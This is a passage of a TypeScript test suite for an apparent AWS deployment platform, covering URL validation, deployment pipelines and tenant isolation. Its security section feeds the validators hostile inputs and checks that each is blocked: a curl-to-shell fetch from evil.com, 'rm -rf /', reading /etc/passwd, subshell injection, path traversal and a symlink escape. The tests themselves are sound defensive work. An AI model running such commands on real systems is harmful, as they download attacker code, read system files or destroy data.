// Force dry-run in automated unit tests so we don't provision real AWS buckets on test runs
process.env.FORCE_DRY_RUN_TEST = 'true';

import assert from 'assert';
import crypto from 'crypto';
import fs from 'fs';
import http from 'http';
import net from 'net';
import os from 'os';
import path from 'path';
import { PassThrough } from 'stream';
import { Express } from 'express';
import { resolveDeployer } from '../deployers';
import { CloudProviderNotAvailableError } from '../deployers/baseDeployer';
import { createApp } from '../server';
import { authService, detectAcademicStudentEmail } from '../services/authService';
import { DeploymentJobQueue } from '../services/deploymentJobQueue';
import { DeploymentManager } from '../services/deploymentManager';
import { githubAppService } from '../services/githubAppService';
import { computeGitHubWebhookSignature } from '../services/githubWebhookService';
import { isolatedBuildRunner } from '../services/isolatedBuilder';
import { RepositoryAnalyzer } from '../services/repositoryAnalyzer';
import { secretsVault } from '../services/secretsVault';
import { securityGuardrails } from '../services/securityGuardrails';
import { selfHealingEngine } from '../services/selfHealingEngine';
import { DeploymentStore } from '../store/deploymentStore';
import {
  resolveServerControlledDomain,
  sanitizeUserEnvVars,
  validateBuildOverrides,
  validateGitHubRepoUrl,
  validateSubdomain,
} from '../utils/validation';

async function runPhase1To3Tests(): Promise<void> {
  console.log('=== Repo2Cloud Phase 1, Phase 2 & Phase 3 Verification Suite ===\n');

  // Task 2: Validate GitHub URL
  console.log('1. Testing Phase 1 (GitHub URL validation)...');
  const validRepo = validateGitHubRepoUrl('https://github.com/example/vite-app');
  assert.strictEqual(validRepo.valid, true);
  assert.strictEqual(validRepo.data?.owner, 'example');
  assert.strictEqual(validRepo.data?.repo, 'vite-app');

  assert.strictEqual(validateGitHubRepoUrl('http://github.com/example/vite-app').valid, false);
  assert.strictEqual(validateGitHubRepoUrl('https://gitlab.com/example/vite-app').valid, false);
  console.log('   ✓ GitHub URL validation passed.');

  // Phase 1 & Phase 3: Multi-Target Recommendation Engine across all 4 AWS targets
  console.log('2. Testing Phase 1 & Phase 3 (Multi-Target Recommendation Engine across 4 AWS targets)...');
  const analyzer = new RepositoryAnalyzer();

  // Target 1: S3_CLOUDFRONT (Vite + React)
  const viteResult = analyzer.evaluateSnapshot({
    files: ['package.json', 'vite.config.ts', 'index.html'],
    packageJson: {
      name: 'vite-demo',
      scripts: { build: 'npm run build' },
      dependencies: { react: '^18.3.0' },
      devDependencies: { vite: '^5.4.0' },
    },
  });
  assert.strictEqual(viteResult.framework, 'Vite + React');
  assert.strictEqual(viteResult.buildCommand, 'npm run build');
  assert.strictEqual(viteResult.outputDirectory, 'dist');
  assert.strictEqual(viteResult.recommendedTarget, 'S3_CLOUDFRONT');
  assert.strictEqual(viteResult.targetOptions?.length, 4, 'Expected all 4 target options in Phase 3');

  // Target 2: ECS_FARGATE (Express + Dockerfile)
  const ecsResult = analyzer.evaluateSnapshot({
    files: ['package.json', 'Dockerfile', 'server.js'],
    dockerfileContent: 'FROM node:20-alpine\nEXPOSE 8080\nCMD ["node", "server.js"]',
    packageJson: {
      name: 'express-api',
      main: 'server.js',
      scripts: { start: 'node server.js' },
      dependencies: { express: '^4.19.2' },
    },
  });
  assert.strictEqual(ecsResult.recommendedTarget, 'ECS_FARGATE');
  assert.strictEqual(ecsResult.suggestedContainerPort, 8080);
  assert.strictEqual(ecsResult.suggestedHealthCheckPath, '/health');

  // Target 3: LAMBDA_API_GATEWAY (Serverless / Lambda handler)
  const lambdaResult = analyzer.evaluateSnapshot({
    files: ['package.json', 'serverless.yml', 'handler.js'],
    packageJson: {
      name: 'serverless-api',
      dependencies: { 'serverless-http': '^3.2.0', express: '^4.19.2' },
    },
  });
  assert.strictEqual(lambdaResult.recommendedTarget, 'LAMBDA_API_GATEWAY');
  assert.strictEqual(lambdaResult.suggestedLambdaHandler, 'handler.handler');

  // Target 4: AMPLIFY (Next.js SSR without static export)
  const amplifyResult = analyzer.evaluateSnapshot({
    files: ['package.json', 'next.config.mjs'],
    packageJson: {
      name: 'nextjs-ssr',
      scripts: { build: 'next build', start: 'next start' },
      dependencies: { next: '^14.2.0', react: '^18.3.0' },
    },
  });
  assert.strictEqual(amplifyResult.recommendedTarget, 'AMPLIFY');

  // Full-Stack Monorepo Target: ECS_FARGATE (API + Web Frontend)
  const monorepoResult = analyzer.evaluateSnapshot({
    files: ['package.json', 'backend', 'frontend', 'frontend/next.config.mjs'],
    packageJson: {
      name: 'deploy-mate',
      workspaces: ['backend', 'frontend'],
      scripts: {
        dev: 'npm run dev --workspace=backend & npm run dev --workspace=frontend',
        'dev:backend': 'npm run dev --workspace=backend',
        build: 'npm run build',
      },
    },
    backendPackageJson: {
      name: 'backend',
      main: 'src/server.ts',
      dependencies: { express: '^4.19.2' },
    },
  });
  assert.strictEqual(monorepoResult.recommendedTarget, 'ECS_FARGATE');
  assert.strictEqual(monorepoResult.framework, 'Full-Stack Monorepo (API + Web)');
  assert.strictEqual(monorepoResult.suggestedContainerPort, 4000);
  assert.strictEqual(monorepoResult.suggestedHealthCheckPath, '/api/health');

  console.log('   ✓ Phase 3 Multi-Target Recommendation Engine verified for S3_CLOUDFRONT, ECS_FARGATE, LAMBDA_API_GATEWAY, and AMPLIFY (including Full-Stack Monorepos).');

  // Phase 2: Subdomain & Server-Controlled Base Domain Validation
  console.log('3. Testing Phase 2 (RFC-1123 subdomain & server-controlled domain validation)...');
  assert.strictEqual(validateSubdomain('my-app-2026').valid, true);
  assert.strictEqual(validateSubdomain('-bad-start').valid, false);
  assert.strictEqual(validateSubdomain('bad_underscore').valid, false);
  assert.strictEqual(validateSubdomain('api').valid, false, 'Reserved subdomain should be rejected');
  assert.strictEqual(validateSubdomain('a').valid, false, 'Too short subdomain should be rejected');

  assert.strictEqual(resolveServerControlledDomain('maas-fam.com').valid, true);
  assert.strictEqual(resolveServerControlledDomain('evil.com').valid, false);
  console.log('   ✓ RFC-1123 subdomain & server-controlled domain validation passed.');

  // Phase 1, Phase 2 & Phase 3 End-to-End Pipeline + Dynamic Overrides + 409 Conflict
  console.log('4. Testing Phase 1–3 Pipeline (Custom Subdomain + Dynamic Form Overrides + 409 Conflict)...');
  const tmpStoreFile = path.join(os.tmpdir(), `repo2cloud-phase3-test-${Date.now()}.json`);
  const store = new DeploymentStore(tmpStoreFile);
  const manager = new DeploymentManager(store);

  const startRes = await manager.startDeployment({
    repoUrl: 'https://github.com/example/vite-app',
    target: 'S3_CLOUDFRONT',
    deploymentType: 'static',
    subdomain: 'technica-demo',
    domain: 'maas-fam.com',
    buildCommandOverride: 'npm run build',
    outputDirOverride: 'dist',
    envVars: { VITE_APP_ENV: 'staging' },
  });
  assert.strictEqual(startRes.ok, true);
  assert.strictEqual(startRes.deployment?.status, 'BUILDING');
  assert.strictEqual(startRes.deployment?.customHostname, 'technica-demo.maas-fam.com');
  assert.deepStrictEqual(startRes.deployment?.targetConfig?.envVarKeys, ['VITE_APP_ENV']);

  // Attempt duplicate subdomain deployment -> must return 409 Conflict immediately
  const duplicateRes = await manager.startDeployment({
    repoUrl: 'https://github.com/example/other-app',
    deploymentType: 'static',
    subdomain: 'technica-demo',
    domain: 'maas-fam.com',
  });
  assert.strictEqual(duplicateRes.ok, false);
  assert.strictEqual(duplicateRes.statusCode, 409, 'Duplicate subdomain must return 409 Conflict');
  console.log('   ✓ Atomic hostname reservation & 409 Conflict on duplicate subdomain verified.');

  const depId = startRes.deployment!.deploymentId;
  for (let i = 0; i < 40; i++) {
    const current = store.get(depId);
    if (current?.status === 'LIVE' || current?.status === 'FAILED') {
      break;
    }
    await new Promise((r) => setTimeout(r, 200));
  }

  const completed = store.get(depId)!;
  assert.strictEqual(completed.status, 'LIVE');
  assert.strictEqual(completed.url, 'https://technica-demo.maas-fam.com');
  assert.ok(completed.infrastructureUrl?.endsWith('.cloudfront.net'));
  assert.ok(completed.resources.acmCertificateArn, 'Expected ACM certificate ARN in resources');
  assert.strictEqual(completed.resources.route53RecordName, 'technica-demo.maas-fam.com', 'Expected Route 53 Alias record in resources');

  // Test teardown releases the custom hostname reservation
  const delRes = await manager.deleteDeployment(depId);
  assert.strictEqual(delRes.ok, true);
  assert.strictEqual(store.isHostnameAvailable('technica-demo.maas-fam.com'), true, 'Hostname must be released after delete');
  console.log(`   ✓ End-to-end Phase 1–3 deployment & teardown verified (${completed.url}).`);

  // Phase 4: Containerized Full-Stack / Backend on ECS Fargate + ECR + ALB
  console.log('5. Testing Phase 4 (ECS Fargate + ECR + ALB + Auto-Dockerfile + Custom Subdomain)...');
  const ecsStartRes = await manager.startDeployment({
    repoUrl: 'https://github.com/example/express-docker-api',
    target: 'ECS_FARGATE',
    subdomain: 'express-api',
    domain: 'maas-fam.com',
    containerPort: 8080,
    healthCheckPath: '/health',
    envVars: { PORT: '8080', NODE_ENV: 'production' },
  });
  assert.strictEqual(ecsStartRes.ok, true);
  assert.strictEqual(ecsStartRes.deployment?.target, 'ECS_FARGATE');
  assert.strictEqual(ecsStartRes.deployment?.deploymentType, 'container');
  assert.strictEqual(ecsStartRes.deployment?.customHostname, 'express-api.maas-fam.com');

  const ecsDepId = ecsStartRes.deployment!.deploymentId;
  for (let i = 0; i < 40; i++) {
    const current = store.get(ecsDepId);
    if (current?.status === 'LIVE' || current?.status === 'FAILED') {
      break;
    }
    await new Promise((r) => setTimeout(r, 200));
  }

  const ecsCompleted = store.get(ecsDepId)!;
  assert.strictEqual(ecsCompleted.status, 'LIVE', 'ECS_FARGATE deployment must reach LIVE status');
  assert.strictEqual(ecsCompleted.url, 'https://express-api.maas-fam.com');
  assert.ok(ecsCompleted.resources.ecrRepositoryUri, 'Expected ECR repository URI in resources');
  assert.ok(ecsCompleted.resources.ecsClusterName, 'Expected ECS cluster name in resources');
  assert.ok(ecsCompleted.resources.ecsServiceName, 'Expected ECS service name in resources');
  assert.ok(ecsCompleted.resources.ecsTaskDefinitionArn, 'Expected ECS task definition ARN in resources');
  assert.ok(ecsCompleted.resources.albTargetGroupArn, 'Expected ALB target group ARN in resources');
  assert.strictEqual(ecsCompleted.resources.route53RecordName, 'express-api.maas-fam.com');

  const ecsDelRes = await manager.deleteDeployment(ecsDepId);
  assert.strictEqual(ecsDelRes.ok, true);
  assert.strictEqual(ecsDelRes.deployment?.status, 'DELETED');
  assert.strictEqual(store.isHostnameAvailable('express-api.maas-fam.com'), true, 'ECS hostname must be released after delete');
  console.log(`   ✓ End-to-end Phase 4 ECS Fargate deployment & teardown verified (${ecsCompleted.url}).`);

  // Phase 5: Serverless Backend / APIs on AWS Lambda + Amazon API Gateway v2
  console.log('6. Testing Phase 5 (AWS Lambda + API Gateway v2 HTTP API + PKZIP Bundle + Custom Subdomain)...');
  const lambdaStartRes = await manager.startDeployment({
    repoUrl: 'https://github.com/example/serverless-lambda-api',
    target: 'LAMBDA_API_GATEWAY',
    subdomain: 'serverless-api',
    domain: 'maas-fam.com',
    lambdaHandler: 'handler.handler',
    runtime: 'nodejs20.x',
    envVars: { STAGE: 'prod' },
  });
  assert.strictEqual(lambdaStartRes.ok, true);
  assert.strictEqual(lambdaStartRes.deployment?.target, 'LAMBDA_API_GATEWAY');
  assert.strictEqual(lambdaStartRes.deployment?.deploymentType, 'serverless');
  assert.strictEqual(lambdaStartRes.deployment?.customHostname, 'serverless-api.maas-fam.com');

  const lambdaDepId = lambdaStartRes.deployment!.deploymentId;
  for (let i = 0; i < 40; i++) {
    const current = store.get(lambdaDepId);
    if (current?.status === 'LIVE' || current?.status === 'FAILED') {
      break;
    }
    await new Promise((r) => setTimeout(r, 200));
  }

  const lambdaCompleted = store.get(lambdaDepId)!;
  assert.strictEqual(lambdaCompleted.status, 'LIVE', 'LAMBDA_API_GATEWAY deployment must reach LIVE status');
  assert.strictEqual(lambdaCompleted.url, 'https://serverless-api.maas-fam.com');
  assert.ok(lambdaCompleted.resources.lambdaFunctionName, 'Expected Lambda function name in resources');
  assert.ok(lambdaCompleted.resources.lambdaRoleArn, 'Expected Lambda execution role ARN in resources');
  assert.ok(lambdaCompleted.resources.apiGatewayId, 'Expected API Gateway v2 ID in resources');
  assert.ok(
    lambdaCompleted.resources.apiGatewayEndpoint?.includes('.execute-api.'),
    'Expected API Gateway v2 endpoint in resources'
  );
  assert.strictEqual(lambdaCompleted.resources.route53RecordName, 'serverless-api.maas-fam.com');

  const lambdaDelRes = await manager.deleteDeployment(lambdaDepId);
  assert.strictEqual(lambdaDelRes.ok, true);
  assert.strictEqual(lambdaDelRes.deployment?.status, 'DELETED');
  assert.strictEqual(
    store.isHostnameAvailable('serverless-api.maas-fam.com'),
    true,
    'Lambda custom hostname must be released after delete'
  );
  console.log(`   ✓ End-to-end Phase 5 Lambda + API Gateway deployment & teardown verified (${lambdaCompleted.url}).`);

  // Phase 6: Managed Full-Stack / Next.js SSR Hosting on AWS Amplify
  console.log('7. Testing Phase 6 (AWS Amplify Hosting + Auto amplify.yml + WEB_COMPUTE SSR + Custom Subdomain)...');
  const amplifyStartRes = await manager.startDeployment({
    repoUrl: 'https://github.com/example/nextjs-ssr-app',
    target: 'AMPLIFY',
    subdomain: 'nextjs-ssr',
    domain: 'maas-fam.com',
    branch: 'main',
    buildCommandOverride: 'npm run build',
    envVars: { NEXT_PUBLIC_API_URL: 'https://serverless-api.maas-fam.com' },
  });
  assert.strictEqual(amplifyStartRes.ok, true);
  assert.strictEqual(amplifyStartRes.deployment?.target, 'AMPLIFY');
  assert.strictEqual(amplifyStartRes.deployment?.deploymentType, 'amplify');
  assert.strictEqual(amplifyStartRes.deployment?.customHostname, 'nextjs-ssr.maas-fam.com');

  const amplifyDepId = amplifyStartRes.deployment!.deploymentId;
  for (let i = 0; i < 40; i++) {
    const current = store.get(amplifyDepId);
    if (current?.status === 'LIVE' || current?.status === 'FAILED') {
      break;
    }
    await new Promise((r) => setTimeout(r, 200));
  }

  const amplifyCompleted = store.get(amplifyDepId)!;
  assert.strictEqual(amplifyCompleted.status, 'LIVE', 'AMPLIFY deployment must reach LIVE status');
  assert.strictEqual(amplifyCompleted.url, 'https://nextjs-ssr.maas-fam.com');
  assert.ok(amplifyCompleted.resources.amplifyAppId, 'Expected AWS Amplify App ID in resources');
  assert.strictEqual(amplifyCompleted.resources.amplifyBranchName, 'main', 'Expected AWS Amplify branch name in resources');
  assert.ok(
    amplifyCompleted.infrastructureUrl?.endsWith('.amplifyapp.com'),
    'Expected underlying *.amplifyapp.com URL in infrastructureUrl'
  );
  assert.strictEqual(amplifyCompleted.resources.route53RecordName, 'nextjs-ssr.maas-fam.com');

  const amplifyDelRes = await manager.deleteDeployment(amplifyDepId);
  assert.strictEqual(amplifyDelRes.ok, true);
  assert.strictEqual(amplifyDelRes.deployment?.status, 'DELETED');
  assert.strictEqual(
    store.isHostnameAvailable('nextjs-ssr.maas-fam.com'),
    true,
    'Amplify custom hostname must be released after delete'
  );
  console.log(`   ✓ End-to-end Phase 6 AWS Amplify deployment & teardown verified (${amplifyCompleted.url}).`);

  // Phase 7: Build Isolation, Security Guardrails & Cost/Resource Limits
  console.log('8. Testing Phase 7 (Command Injection, Path Traversal, Secret Stripping, Symlink Escape & Quotas)...');

  // 8a. Command injection in buildCommandOverride must be blocked
  const cmdInj1 = validateBuildOverrides({
    buildCommandOverride: 'npm run build; curl https://evil.com/shell.sh | sh',
  });
  assert.strictEqual(cmdInj1.valid, false, 'Command chaining with ; must be blocked');

  const cmdInj2 = validateBuildOverrides({
    buildCommandOverride: 'npm run $(whoami)',
  });
  assert.strictEqual(cmdInj2.valid, false, 'Subshell $(...) must be blocked');

  const cmdInj3 = validateBuildOverrides({
    buildCommandOverride: 'bash -c "cat /etc/passwd"',
  });
  assert.strictEqual(cmdInj3.valid, false, 'Arbitrary shell binary must be blocked');

  const safeCmd = validateBuildOverrides({
    buildCommandOverride: 'npm run build',
    outputDirOverride: 'dist',
    healthCheckPath: '/health',
    lambdaHandler: 'index.handler',
    containerPort: 8080,
  });
  assert.strictEqual(safeCmd.valid, true, 'Standard build overrides must be allowed');

  // 8b. Path traversal in outputDirOverride must be blocked
  assert.strictEqual(
    validateBuildOverrides({ outputDirOverride: '../../etc' }).valid,
    false,
    'Relative path traversal (..) must be blocked'
  );
  assert.strictEqual(
    validateBuildOverrides({ outputDirOverride: '/etc/passwd' }).valid,
    false,
    'Absolute path (/etc/passwd) must be blocked'
  );
  assert.strictEqual(
    validateBuildOverrides({ outputDirOverride: '.git/config' }).valid,
    false,
    '.git directory exposure must be blocked'
  );

  // 8c. AWS_* and GITHUB_* secret env vars must be blocked
  assert.strictEqual(
    sanitizeUserEnvVars({ AWS_SECRET_ACCESS_KEY: 'leak' }).valid,
    false
  );
  assert.strictEqual(
    sanitizeUserEnvVars({ AWS_CUSTOM_CREDENTIAL: 'leak' }).valid,
    false
  );
  assert.strictEqual(
    sanitizeUserEnvVars({ GITHUB_ACCESS_TOKEN: 'leak' }).valid,
    false
  );

  // 8d. Symlink escape outside workspace must be blocked
  const symlinkTestDir = path.join(os.tmpdir(), `repo2cloud-symlink-test-${Date.now()}`);
  fs.mkdirSync(symlinkTestDir, { recursive: true });
  const escapeLinkPath = path.join(symlinkTestDir, 'escaped-secret.txt');
  fs.symlinkSync('/etc/hosts', escapeLinkPath);
  let symlinkBlocked = false;
  try {
    isolatedBuildRunner.verifyWorkspaceSafety(symlinkTestDir);
  } catch (err: unknown) {
    if (err instanceof Error && err.message.includes('Symlink escape blocked')) {
      symlinkBlocked = true;
    }
  } finally {
    fs.rmSync(symlinkTestDir, { recursive: true, force: true });
  }
  assert.strictEqual(symlinkBlocked, true, 'Symlink pointing outside workspace must be blocked');

  // 8e. DeploymentManager rejects malicious overrides with 400 Bad Request
  const badDeployRes = await manager.startDeployment({
    repoUrl: 'https://github.com/example/vite-app',
    target: 'S3_CLOUDFRONT',
    buildCommandOverride: 'npm run build && rm -rf /',
  });
  assert.strictEqual(badDeployRes.ok, false);
  assert.strictEqual(badDeployRes.statusCode, 400);

  // 8f. Security guardrails status snapshot
  const secStatus = securityGuardrails.getStatus(store);
  assert.strictEqual(secStatus.isolation.awsCredentialsStripped, true);
  assert.strictEqual(secStatus.isolation.symlinkEscapeProtection, true);
  assert.strictEqual(secStatus.isolation.commandInjectionFilter, true);
  console.log('   ✓ Phase 7 build isolation, command/path filters, symlink escape protection & quotas verified.');

  // Phase 8: Self-Healing Engine & Real-Time Platform Observability Metrics
  console.log('9. Testing Phase 8 (Self-Healing Failure Diagnosis, Auto-Remediation & Platform Observability Metrics)...');
  const diagEmptyOut = selfHealingEngine.diagnoseFailure(
    'Build finished but output directory "dist/" is empty.',
    'BUILDING'
  );
  assert.strictEqual(diagEmptyOut.errorCode, 'EMPTY_OUTPUT_DIRECTORY');
  assert.strictEqual(diagEmptyOut.autoRemediable, true);
  assert.strictEqual(diagEmptyOut.patchedAnalysis?.outputDirectory, '.');

  const diagIam = selfHealingEngine.diagnoseFailure(
    'The role defined for the function cannot be assumed by Lambda.',
    'DEPLOYING'
  );
  assert.strictEqual(diagIam.errorCode, 'TRANSIENT_CLOUD_PROPAGATION');
  assert.strictEqual(diagIam.autoRemediable, true);

  const metrics = selfHealingEngine.computeMetrics(store);
  assert.strictEqual(metrics.totalDeployments, 4, 'Expected all 4 target deployments recorded in metrics');
  assert.strictEqual(metrics.successRatePercent, 100, 'Expected 100% success rate across all 4 targets');
  assert.strictEqual(metrics.byTarget.S3_CLOUDFRONT, 1);
  assert.strictEqual(metrics.byTarget.ECS_FARGATE, 1);
  assert.strictEqual(metrics.byTarget.LAMBDA_API_GATEWAY, 1);
  assert.strictEqual(metrics.byTarget.AMPLIFY, 1);

  if (fs.existsSync(tmpStoreFile)) {
    fs.unlinkSync(tmpStoreFile);
  }
  console.log('   ✓ Phase 8 Self-Healing diagnosis & platform observability metrics verified across all 4 AWS targets.\n');
  console.log('ALL PHASE 1, PHASE 2, PHASE 3, PHASE 4, PHASE 5, PHASE 6, PHASE 7 & PHASE 8 TESTS PASSED!\n');
}

/**
 * In-process Express HTTP harness so integration, JWT, RBAC, IDOR, and SSE streaming tests
 * run deterministically inside sandboxed CI environments without requiring TCP port binding.
 */
async function invokeApp(
  expressApp: Express,
  method: 'GET' | 'POST' | 'PUT' | 'PATCH' | 'DELETE',
  urlPath: string,
  opts?: {
    body?: unknown;
    rawBody?: string;
    headers?: Record<string, string>;
  }
): Promise<{
  status: number;
  headers: http.OutgoingHttpHeaders;
  text: string;
  json: <T = Record<string, unknown>>() => T;
}> {
  return new Promise((resolve, reject) => {
    const mockSocket = Object.assign(new PassThrough(), {
      remoteAddress: '127.0.0.1',
    }) as unknown as net.Socket;

    const req = new http.IncomingMessage(mockSocket);
    req.method = method;
    req.url = urlPath;

    const rawBody =
      opts?.rawBody !== undefined
        ? opts.rawBody
        : opts?.body !== undefined
        ? JSON.stringify(opts.body)
        : undefined;
    const lowerHeaders: Record<string, string> = {};
    if (opts?.headers) {
      for (const [k, v] of Object.entries(opts.headers)) {
        lowerHeaders[k.toLowerCase()] = v;
      }
    }
    if (rawBody !== undefined) {
      if (!lowerHeaders['content-type']) {
        lowerHeaders['content-type'] = 'application/json';
      }
      lowerHeaders['content-length'] = String(Buffer.byteLength(rawBody, 'utf8'));
    }
    req.headers = lowerHeaders;

    if (rawBody !== undefined) {
      req.push(Buffer.from(rawBody, 'utf8'));
    }
    req.push(null);

    const res = new http.ServerResponse(req);
    const chunks: Buffer[] = [];

    res.flushHeaders = () => {};
    res.write = ((chunk: unknown, encoding?: unknown, cb?: unknown) => {
      if (chunk) {
        chunks.push(
          Buffer.isBuffer(chunk)
            ? chunk
            : Buffer.from(
                String(chunk),
                typeof encoding === 'string' ? (encoding as BufferEncoding) : 'utf8'
              )
        );
      }
      if (typeof encoding === 'function') encoding();
      else if (typeof cb === 'function') cb();
      return true;
    }) as typeof res.write;

    res.end = ((chunk?: unknown, encoding?: unknown, cb?: unknown) => {
      if (chunk && typeof chunk !== 'function') {
        chunks.push(
          Buffer.isBuffer(chunk)
            ? chunk
            : Buffer.from(
                String(chunk),
                typeof encoding === 'string' ? (encoding as BufferEncoding) : 'utf8'
              )
        );
      }
      if (typeof chunk === 'function') chunk();
      else if (typeof encoding === 'function') encoding();
      else if (typeof cb === 'function') cb();

      const text = Buffer.concat(chunks).toString('utf8');
      resolve({
        status: res.statusCode,
        headers: res.getHeaders(),
        text,
        json: <T = Record<string, unknown>>() => JSON.parse(text) as T,
      });
      return res;
    }) as typeof res.end;

    try {
      expressApp(req, res);
    } catch (err) {
      reject(err);
    }
  });
}

async function runPhase9Sprint1Tests(): Promise<void> {
  console.log('=== DeployMate Phase 9 · Sprint 1 Verification Suite (DM-901 to DM-905) ===\n');

  const tmpDbPath = path.join(os.tmpdir(), `deploymate-phase9-sprint1-${Date.now()}.json`);
  const store = new DeploymentStore(tmpDbPath);
  const queue = new DeploymentJobQueue({
    maxConcurrency: 2,
    maxQueueBacklog: 20,
    jobTimeoutMs: 15_000,
  });
  const manager = new DeploymentManager(store, queue);
  const testApp = createApp(store, manager, queue);

  // ==========================================================================
  // DM-901 (#1): Cloud-Agnostic Core Refactor & Multi-Cloud Registry
  // ==========================================================================
  console.log('10. Testing DM-901 (Multi-Cloud Provider + Archetype Registry & 501 Coming Soon)...');

  // TC-901-01: Resolve all 4 AWS workload archetypes
  assert.strictEqual(resolveDeployer('AWS', 'STATIC_EDGE').target, 'S3_CLOUDFRONT');
  assert.strictEqual(resolveDeployer('AWS', 'CONTAINER_SERVICE').target, 'ECS_FARGATE');
  assert.strictEqual(resolveDeployer('AWS', 'SERVERLESS_FUNC').target, 'LAMBDA_API_GATEWAY');
  assert.strictEqual(resolveDeployer('AWS', 'SSR_WEB').target, 'AMPLIFY');

  let gcpErrThrown = false;
  try {
    resolveDeployer('GCP', 'CONTAINER_SERVICE');
  } catch (err) {
    if (err instanceof CloudProviderNotAvailableError) {
      gcpErrThrown = true;
      assert.strictEqual(err.statusCode, 501);
      assert.strictEqual(err.code, 'CLOUD_PROVIDER_COMING_SOON');
      assert.strictEqual(err.plannedTarget, 'GCP_CLOUD_RUN');
    }
  }
  assert.strictEqual(gcpErrThrown, true, 'Expected CloudProviderNotAvailableError for GCP');

  // TC-901-02: Legacy HTTP POST /api/deploy without cloudProvider defaults to AWS + STATIC_EDGE + DEPLOYMATE_MANAGED
  const legacyHttpRes = await invokeApp(testApp, 'POST', '/api/deploy', {
    body: {
      repoUrl: 'https://github.com/example/vite-app',
      target: 'S3_CLOUDFRONT',
    },
  });
  assert.strictEqual(legacyHttpRes.status, 202);
  const legacyBody = legacyHttpRes.json<{
    deploymentId: string;
    cloudProvider: string;
    archetype: string;
    tenancy: string;
  }>();
  assert.strictEqual(legacyBody.cloudProvider, 'AWS');
  assert.strictEqual(legacyBody.archetype, 'STATIC_EDGE');
  assert.strictEqual(legacyBody.tenancy, 'DEPLOYMATE_MANAGED');

  // Wait for legacy deployment to finish so queue is idle for subsequent load tests
  for (let i = 0; i < 40; i++) {
    const cur = store.get(legacyBody.deploymentId);
    if (cur?.status === 'LIVE' || cur?.status === 'FAILED') break;
    await new Promise((r) => setTimeout(r, 150));
  }
  assert.strictEqual(store.get(legacyBody.deploymentId)?.status, 'LIVE');

  // TC-901-03: GCP and AZURE HTTP requests return structured 501 without leaking hostname reservations
  const gcpHttpRes = await invokeApp(testApp, 'POST', '/api/deploy', {
    body: {
      repoUrl: 'https://github.com/example/express-docker-api',
      cloudProvider: 'GCP',
      archetype: 'CONTAINER_SERVICE',
      subdomain: 'gcp-not-leaked',
      domain: 'maas-fam.com',
    },
  });
  assert.strictEqual(gcpHttpRes.status, 501);
  const gcpBody = gcpHttpRes.json<{
    code: string;
    plannedTarget: string;
    remediation: string;
  }>();
  assert.strictEqual(gcpBody.code, 'CLOUD_PROVIDER_COMING_SOON');
  assert.strictEqual(gcpBody.plannedTarget, 'GCP_CLOUD_RUN');
  assert.ok(gcpBody.remediation.includes('Phase 10'));
  assert.strictEqual(
    store.isHostnameAvailable('gcp-not-leaked.maas-fam.com'),
    true,
    '501 rejection must not leak subdomain reservation'
  );

  const azureHttpRes = await invokeApp(testApp, 'POST', '/api/deploy', {
    body: {
      repoUrl: 'https://github.com/example/vite-app',
      cloudProvider: 'AZURE',
      archetype: 'STATIC_EDGE',
    },
  });
  assert.strictEqual(azureHttpRes.status, 501);
  assert.strictEqual(
    azureHttpRes.json<{ plannedTarget: string }>().plannedTarget,
    'AZURE_STATIC_FRONTDOOR'
  );
  console.log('   ✓ DM-901 (TC-901-01, TC-901-02, TC-901-03) passed.');

  // ==========================================================================
  // DM-902 (#2): Multi-Tenant Persistence Layer & Atomic Hostname Reservation
  // ==========================================================================
  console.log('11. Testing DM-902 (20-Way Atomic Hostname Race, Tenant Isolation & Reload Persistence)...');

  // Verify PostgreSQL DDL migration file exists with UNIQUE hostname constraint
  const ddlPath = path.resolve(__dirname, '../store/postgresSchema.sql');
  assert.strictEqual(fs.existsSync(ddlPath), true, 'Expected postgresSchema.sql migration file');
  const ddlText = fs.readFileSync(ddlPath, 'utf8');
  assert.ok(ddlText.includes('CREATE TABLE IF NOT EXISTS reserved_hostnames'));
  assert.ok(/hostname\s+VARCHAR\(255\)\s+PRIMARY KEY/.test(ddlText));

  // TC-902-01: 20-way concurrent reserveHostname race -> exactly 1 winner, 19 conflicts
  const raceAttempts = await Promise.all(
    Array.from({ length: 20 }, (_, idx) =>
      Promise.resolve().then(() =>
        store.reserveHostname('race-winner.maas-fam.com', `dep_race_${idx}`)
      )
    )
  );
  const winners = raceAttempts.filter((r) => r.reserved);
  const losers = raceAttempts.filter((r) => !r.reserved);
  assert.strictEqual(winners.length, 1, 'Exactly 1 concurrent caller may reserve the hostname');
  assert.strictEqual(losers.length, 19, 'Remaining 19 callers must receive conflict');
  store.releaseHostname('race-winner.maas-fam.com');

  // TC-902-02 & TC-902-03: Tenant-scoped listByOrg / getForOrg + disk reload survival
  const sessionOrg1 = authService.loginOrRegisterUser(
    { email: 'tenant1@acme.io', displayName: 'Tenant One' },
    store
  );
  const sessionOrg2 = authService.loginOrRegisterUser(
    { email: 'tenant2@globex.io', displayName: 'Tenant Two' },
    store
  );
  const org1Id = sessionOrg1.defaultOrganization.orgId;
  const org2Id = sessionOrg2.defaultOrganization.orgId;

  const depOrg1 = await manager.startDeployment({
    repoUrl: 'https://github.com/example/vite-app',
    orgId: org1Id,
    createdByUserId: sessionOrg1.user.userId,
  });
  const depOrg2 = await manager.startDeployment({
    repoUrl: 'https://github.com/example/express-docker-api',
    target: 'ECS_FARGATE',
    orgId: org2Id,
    createdByUserId: sessionOrg2.user.userId,
  });
  assert.strictEqual(depOrg1.ok, true);
  assert.strictEqual(depOrg2.ok, true);

  for (let i = 0; i < 40; i++) {
    const d1 = store.get(depOrg1.deployment!.deploymentId);
    const d2 = store.get(depOrg2.deployment!.deploymentId);
    if (d1?.status === 'LIVE' && d2?.status === 'LIVE') break;
    await new Promise((r) => setTimeout(r, 150));
  }

  const org1List = store.listByOrg(org1Id);
  assert.strictEqual(org1List.length, 1);
  assert.strictEqual(org1List[0].deploymentId, depOrg1.deployment!.deploymentId);
  assert.strictEqual(
    store.getForOrg(depOrg2.deployment!.deploymentId, org1Id),
    undefined,
    'Cross-org getForOrg lookup must return undefined'
  );

  // TC-902-03: Reload persistence from disk
  const reloadedStore = new DeploymentStore(tmpDbPath);
  assert.strictEqual(reloadedStore.listByOrg(org1Id).length, 1);
  assert.strictEqual(reloadedStore.listByOrg(org2Id).length, 1);
  assert.strictEqual(reloadedStore.getUserByEmail('tenant1@acme.io')?.userId, sessionOrg1.user.userId);
  console.log('   ✓ DM-902 (TC-902-01, TC-902-02, TC-902-03) passed.');

  // ==========================================================================
  // DM-903 (#3): Bounded Async Worker Queue, Timeout Watchdog & Real-Time SSE
  // ==========================================================================
